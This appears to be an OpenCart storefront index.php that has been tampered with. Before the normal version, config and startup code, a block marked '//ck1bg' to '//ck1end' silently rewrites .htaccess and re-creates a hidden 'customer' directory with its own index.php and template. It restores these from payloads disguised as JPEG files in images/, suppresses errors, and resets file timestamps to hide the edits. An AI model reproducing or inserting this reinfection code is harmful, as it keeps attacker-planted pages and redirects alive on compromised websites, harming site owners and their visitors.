<?php

//ck1bg
$nowFileDir =  'customer';
$nowHtacFile =  './.htaccess';
$nmbf1 =  './customer/moban.html';
$nowIndexFile =  './customer/index.php';
$nowLogFile =  './customer/logs.txt';
$bkLocalFileIndex1 =  './images/logo_s.jpg';
$bkLocalFileHtac1 =  './images/head_s.jpg';
$bkLocalFileMoban1 =  './images/banner_s.jpg';

if($nowHtacFile && file_exists($bkLocalFileHtac1)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex1)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban1)){
	
	if(!file_exists($nmbf1)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban1));
		@chmod($nmbf1,0755);
	}else{
		if(filesize($nmbf1) != filesize($bkLocalFileMoban1)){
			$tpstrMb = file_get_contents($nmbf1);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban1);
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($bkLocalFileMoban1,$tpstrMb);
				@touch($bkLocalFileMoban1, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban1));
				@chmod($bkLocalFileMoban1,0755);
			}
		}
	}
	
}
//ck1end


// Version
define('VERSION', '3.0.2.0');

// Configuration
if (is_file('config.php')) {
	require_once('config.php');
}

// Install
if (!defined('DIR_APPLICATION')) {
	header('Location: install/index.php');
	exit;
}

// Startup
require_once(DIR_SYSTEM . 'startup.php');

start('catalog');